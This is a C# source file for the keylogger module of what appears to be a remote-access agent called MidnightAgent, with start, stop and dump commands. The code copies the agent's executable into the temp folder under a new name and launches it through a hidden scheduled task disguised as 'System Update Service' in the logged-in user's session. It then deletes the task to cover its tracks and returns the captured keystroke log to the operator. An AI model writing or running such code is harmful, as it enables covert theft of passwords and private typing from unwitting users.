using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    public class KeyloggerFeature : IFeature
    {
        public string Command => "keylogger";
        public string Description => "Keylogger (start/stop/dump)";
        public string Usage => "/keylogger [start|stop|dump]";

        private const string WORKER_NAME = "MidnightKeylogger.exe";
        private const string TASK_NAME = "MidnightKeyloggerTask";
        private static readonly string LOG_FILE = Path.Combine(Path.GetTempPath(), "midnight_keylog.txt");

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length < 1) return Task.FromResult(FeatureResult.Fail("Usage: /keylogger [start|stop|dump]"));

            string action = args[0].ToLower();

            try
            {
                if (action == "start")
                {
                    return StartKeylogger();
                }
                else if (action == "stop")
                {
                    return StopKeylogger();
                }
                else if (action == "dump")
                {
                    return DumpLogs();
                }
                else
                {
                    return Task.FromResult(FeatureResult.Fail("Invalid action. Use start, stop, or dump."));
                }
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }

        private Task<FeatureResult> StartKeylogger()
        {
            // check if already running
            if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(WORKER_NAME)).Length > 0)
            {
                return Task.FromResult(FeatureResult.Ok("⚠️ Keylogger is already running."));
            }

            // Copy our executable to temp with new name
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            string targetExe = Path.Combine(Path.GetTempPath(), WORKER_NAME);

            try
            {
                File.Copy(currentExe, targetExe, true);
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Failed to copy agent executable: {ex.Message}"));
            }

            // Arguments for worker
            string arguments = $"--keylogger-worker \"{LOG_FILE}\"";

            // Run using Task Scheduler (SYSTEM -> User)
            if (RunAsUser(targetExe, arguments))
            {
                return Task.FromResult(FeatureResult.Ok($"✅ Keylogger started successfully.\nProcess: {WORKER_NAME}\nLog File: {LOG_FILE}"));
            }
            else
            {
                return Task.FromResult(FeatureResult.Fail("Failed to start keylogger task (could not find active user or schedule task)."));
            }
        }

        private Task<FeatureResult> StopKeylogger()
        {
            int killCount = 0;
            try
            {
                foreach (var proc in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(WORKER_NAME)))
                {
                    proc.Kill();
                    killCount++;
                }

                if (killCount > 0)
                    return Task.FromResult(FeatureResult.Ok($"✅ Keylogger stopped. ({killCount} processes killed)"));
                else
                    return Task.FromResult(FeatureResult.Fail("Keylogger is not running."));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error stopping keylogger: {ex.Message}"));
            }
        }

        private Task<FeatureResult> DumpLogs()
        {
            if (File.Exists(LOG_FILE))
            {
                // We return path, and let main loop upload/display it
                // Or we can just read text if it's small. Let's send as file for safety.
                return Task.FromResult(FeatureResult.File(LOG_FILE, "⌨️ Keylogger Dump"));
            }
            else
            {
                return Task.FromResult(FeatureResult.Fail("No log file found."));
            }
        }

        private bool RunAsUser(string exePath, string args)
        {
            try
            {
                string loggedInUser = GetLoggedInUser();
                if (string.IsNullOrEmpty(loggedInUser)) return false;

                string xmlPath = Path.Combine(Path.GetTempPath(), $"task_{Guid.NewGuid():N}.xml");
                string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo><Description>System Update Service</Description></RegistrationInfo>
  <Triggers><TimeTrigger><StartBoundary>2020-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>{loggedInUser}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <!-- No limit -->
  </Settings>
  <Actions>
    <Exec>
      <Command>""{exePath}""</Command>
      <Arguments>{args}</Arguments>
    </Exec>
  </Actions>
</Task>";
                File.WriteAllText(xmlPath, taskXml);

                RunSchtasks($"/Create /XML \"{xmlPath}\" /TN \"{TASK_NAME}\" /F");
                RunSchtasks($"/Run /TN \"{TASK_NAME}\"");
                
                // Cleanup XML and Task later
                Task.Delay(5000).ContinueWith(_ => {
                     try { File.Delete(xmlPath); } catch { }
                     try { RunSchtasks($"/Delete /TN \"{TASK_NAME}\" /F"); } catch { }
                });

                return true;
            }
            catch { return false; }
        }

        private string GetLoggedInUser()
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName("explorer"))
                {
                    string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
                    using (var searcher = new System.Management.ManagementObjectSearcher(query))
                    {
                        foreach (System.Management.ManagementObject obj in searcher.Get())
                        {
                            string[] ownerInfo = new string[] { string.Empty, string.Empty };
                            if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
                            {
                                string domain = ownerInfo[1];
                                string user = ownerInfo[0];
                                return string.IsNullOrEmpty(domain) ? user : $"{domain}\\{user}";
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        private void RunSchtasks(string arguments)
        {
            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit(5000);
            }
        }
    }
}
